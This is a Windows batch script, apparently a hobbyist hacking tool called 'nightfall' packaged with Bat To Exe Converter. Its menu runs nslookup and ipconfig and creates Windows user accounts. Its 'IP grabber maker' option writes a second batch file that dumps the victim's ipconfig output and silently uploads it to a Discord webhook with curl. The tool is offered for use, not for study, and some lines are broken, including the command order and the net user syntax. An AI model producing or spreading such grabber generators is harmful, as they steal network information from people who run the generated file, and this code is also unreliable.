::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAJBRAy+GG6pDaET+NTz+uLJp1UYNA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title nightfall
chcp 65001 >nul
color d

:main
echo.
echo.
echo           ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗ █████╗ ██╗     ██╗     
echo           ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗██║     ██║     
echo           ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ███████║██║     ██║     
echo           ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██║██║     ██║     
echo           ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ██║  ██║███████╗███████╗
echo           ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
echo                         =type  (help) for the menu
echo.
echo.
echo ┌───────]-Bat Tool[User=Pc]
set /p input="└─# "
cls

if %input% EQU help ( goto menu )


:menu
echo.
echo.
echo           ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗ █████╗ ██╗     ██╗     
echo           ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗██║     ██║     
echo           ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ███████║██║     ██║     
echo           ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██║██║     ██║     
echo           ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ██║  ██║███████╗███████╗
echo           ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
echo.
echo        websites ip : Enter a website to see its cast and IP
echo         See all ip : See all ur ip info   =type ip for this
echo      User creation : Make a new user on windows      ╼╾Type user for this option
echo   Ip grabber maker : Make an IP grabber script    ╼╾Type grabber for ip grabber maker
                         
echo.
echo.
echo ┌───────]-Bat Tool[User=Pc]
set /p input="└─# "
cls

if %input% EQU web (


    :getIPAddressFromWebsite
cls
set /p "website=Enter a URL: "
echo ╔════════════════════════════════════════╗
echo ║[96m[?]Finding information on %website%    ║
echo ╚════════════════════════════════════════╝
timeout /t 3 >nul
nslookup %website%
pause
cls
goto menu
)

if %input% EQU ip (
ipconfig
pause
cls
goto menu
)

if %input% EQU user (
        echo You need adminitstrato do u still want to continue...
    pause
    cls
    goto add



    :add
    echo ----------------------
    echo     user creation
    echo ----------------------
    set /p username="Enter a username: "
    set /p password="Enter a password: "
    net user %username% : %password% /add
    echo loading....
    timeout /t 3 >nul
    echo New user created with batch code
    pause
cls
goto menu
)

if %input% EQU grabber (


    :create_ip_grabber_script
cls
echo [37m╔══════════════════════════╗
echo ║ [91mIp Grabber Script        [37m║
echo [37m╚══════════════════════════╝
set /p "webhook=Enter your Discord webhook URL: "

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo IP grabber script has been created as ip_grabber_exec.bat.
pause
cls
goto menu
)
                                                                       